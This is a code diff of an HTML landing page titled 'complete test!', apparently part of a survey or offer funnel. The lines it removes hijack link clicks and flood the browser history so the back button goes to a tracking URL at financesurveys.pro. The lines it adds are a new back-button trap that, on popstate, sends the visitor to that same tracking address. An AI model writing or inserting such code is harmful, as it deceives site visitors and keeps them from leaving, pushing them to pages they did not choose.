@@ -7,9 +7,6 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 	<title>complete test!</title>
 	<link rel="stylesheet" href="style.css">
-	<script>
-		var back = 'https://track.financesurveys.pro/cwdhl0k.php?lp=1';
-	</script>
 </head>
 
 <body>
@@ -73,44 +70,23 @@
 			}
 		}();
 	</script>
+
+
 	<script>
-		if (typeof under !== "undefined" && under !== null) {
-			if (typeof
-				cta !== "undefined" && cta !== null) {
-				document.addEventListener('click', function (event) {
-					var
-						target = event.target; while (target) {
-							if (target.tagName === 'A' && target.classList.contains(cta)) {
-								const
-									linkHref = target.href; event.preventDefault(); window.open(linkHref, '_blank'); window.location.replace(under); break;
-							}
-							target = target.parentNode;
-						}
-				});
-			} else {
-				document.addEventListener('click', function (event) {
-					var
-						target = event.target; while (target) {
-							if (target.tagName === 'A') {
-								const
-									linkHref = target.href; event.preventDefault(); window.open(linkHref, '_blank'); window.location.replace(under); break;
-							}
-							target = target.parentNode;
-						}
-				});
-			}
-		}
-		if (typeof back !== "undefined" && back !== null) {
-			!(function () {
-				var t; try {
-					const
-						URL = window.location.href.split(/[#]/)[0]; for (t = 0; 10 > t; ++t)history.pushState({}, '', URL + '#'); onpopstate = function (event) { event.state && location.replace(back); };
-				} catch (o) { console.log(o); }
-			})();
-		}
+		(function (window, location) {
+			history.replaceState(null, document.title, location.pathname + "#!/history");
+			history.pushState(null, document.title, location.pathname);
+
+			window.addEventListener("popstate", function () {
+				if (location.hash === "#!/history") {
+					history.replaceState(null, document.title, location.pathname);
+					setTimeout(function () {
+						location.replace("https://track.financesurveys.pro/cwdhl0k.php?lp=1");
+					}, 0);
+				}
+			}, false);
+		}(window, location));
 	</script>
-
-
 
 </body>
 
